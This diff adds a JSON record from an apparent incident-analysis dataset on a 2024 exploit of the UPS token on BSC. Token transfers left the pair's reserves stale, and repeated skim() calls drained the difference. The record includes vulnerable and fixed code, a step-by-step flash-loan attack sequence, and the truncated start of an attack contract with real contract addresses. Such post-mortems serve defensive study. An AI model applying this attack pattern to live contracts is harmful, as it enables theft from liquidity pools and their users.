@@ -1,0 +1,37 @@
+{
+ "id": "2024__2024-04-XX_UPS_SkimWithoutReserveUpdate",
+ "source_file": "2024/2024-04-XX_UPS_SkimWithoutReserveUpdate.md",
+ "title": "UPS — Reserve Non-Update Exploit via Repeated sync/skim Analysis",
+ "date": "2024-04-01",
+ "protocol": "UPS",
+ "chain": "BSC",
+ "loss_raw": "~$28,000",
+ "loss_usd": 28000.0,
+ "root_cause": "When UPS tokens are transferred to the pair, the reserves are not updated, allowing repeated extraction of the difference between actual balance and reserves via repeated `sync()` + `skim()`",
+ "attack_tx": null,
+ "vulnerable_contract": null,
+ "classes": [
+  "business-logic"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: pair reserves not updated after UPS transfer\ncontract UPSToken {\n    function _transfer(address from, address to, uint256 amount) internal {\n        _balances[from] -= amount;\n        _balances[to] += amount;\n        // No _update() call — even when the pair receives tokens, reserves remain unchanged\n        // pair.balance > pair.reserve → extractable via skim()\n    }\n}\n\n// Uniswap V2 Pair\n// skim(): transfers (balance - reserve) to recipient\n// sync(): updates reserve = balance\n\n// Attack pattern:\n// 1. Transfer UPS to pair → balance increases, reserve unchanged\n// 2. skim() → receive (balance - reserve) = the transferred UPS amount\n// → Repeatable (UPS is not consumed)\n\n//",
+  "// File: UPS_decompiled.sol\ncontract UPS {\n    function sync() external {}  // ❌ Vulnerability"
+ ],
+ "code_after": [
+  "✅ Safe code: force pair reserve update after transfer\nfunction _transfer(address from, address to, uint256 amount) internal {\n    _balances[from] -= amount;\n    _balances[to] += amount;\n    // Trigger sync() if recipient is a Uniswap pair\n    if (isPair[to]) {\n        IPancakePair(to).sync();\n    }\n}"
+ ],
+ "steps": [
+  "→ [1] V3 Flash Loan: borrow 3,500,000 USDT",
+  "→ [2] Transfer USDT to UPS/USDT pair → sync()",
+  "→ [3] Swap USDT → UPS (via router)",
+  "→ [4] Transfer UPS to pair (reserves not updated)",
+  "→ [5] pair.skim(attacker) × 10 times",
+  "→ [6] pair.swap(UPS→USDT) × 3 times",
+  "→ [7] Repay V3 flash loan",
+  "→ [8] ~$28K profit"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] V3 Flash Loan: borrow 3,500,000 USDT\n  │\n  ├─→ [2] Transfer USDT to UPS/USDT pair → sync()\n  │         └─ USDT reserves increase significantly\n  │\n  ├─→ [3] Swap USDT → UPS (via router)\n  │\n  ├─→ [4] Transfer UPS to pair (reserves not updated)\n  │         └─ pair.UPS_balance > pair.UPS_reserve\n  │\n  ├─→ [5] pair.skim(attacker) × 10 times\n  │         └─ each call extracts (UPS_balance - UPS_reserve)\n  │\n  ├─→ [6] pair.swap(UPS→USDT) × 3 times\n  │\n  ├─→ [7] Repay V3 flash loan\n  │\n  └─→ [8] ~$28K profit",
+  "interface IPancakePair {\n    function skim(address to) external;\n    function sync() external;\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\n    function getReserves() external view returns (uint112, uint112, uint32);\n}\n\ninterface IUniV3 {\n    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;\n}\n\ncontract AttackContract {\n    IUniV3       constant v3Pool = IUniV3(0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb);\n    IPancakePair constant pair   = IPancakePair(0xA2633ca9Eb7465E7dB54be30f62F577f039a2984);\n    IERC20 constant UPS  = IERC20(0x3dA4828640aD831F3301A4597821Cc3461B06678);\n    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n\n    function testExploit() external {\n  "
+ ]
+}
